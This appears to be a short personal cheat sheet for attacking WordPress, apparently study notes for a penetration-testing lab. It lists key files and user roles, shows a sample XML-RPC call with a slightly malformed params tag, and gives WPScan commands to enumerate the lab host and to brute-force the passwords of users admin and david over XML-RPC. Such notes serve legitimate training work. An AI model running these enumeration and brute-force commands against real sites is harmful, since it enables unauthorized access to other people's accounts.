// WordPress
//! Basics
//* Important files
// xmlrpc.php => services definition
//* Important directories
// always look for directories with listing enabled
// wp-content => themes, plugins, uploads
//* Roles
// Administrator | Editor | Author | Contributor | Subscriber
//* Calling a method
// <methodCall>
//   <methodName>
//     system.listMethods
//   </methodName>
//   </params>
//     <param>
//       <value>
//         <string>
//           hello
//         </string>
//       </value>
//     </param>
//     <param>
//       <value>
//         <int>
//           5
//         </int>
//       </value>
//     </param>
//   </params>
// </methodCall>
//! WPScan
//* Generale scan
// wpscan --url http://blog.inlanefreight.com --enumerate --api-token {api-key}
//* Password brute force
// wpscan --password-attack xmlrpc -t 20 -U admin, david -P 2023-200_most_used_passwords.txt --url http://blog.inlanefreight.com
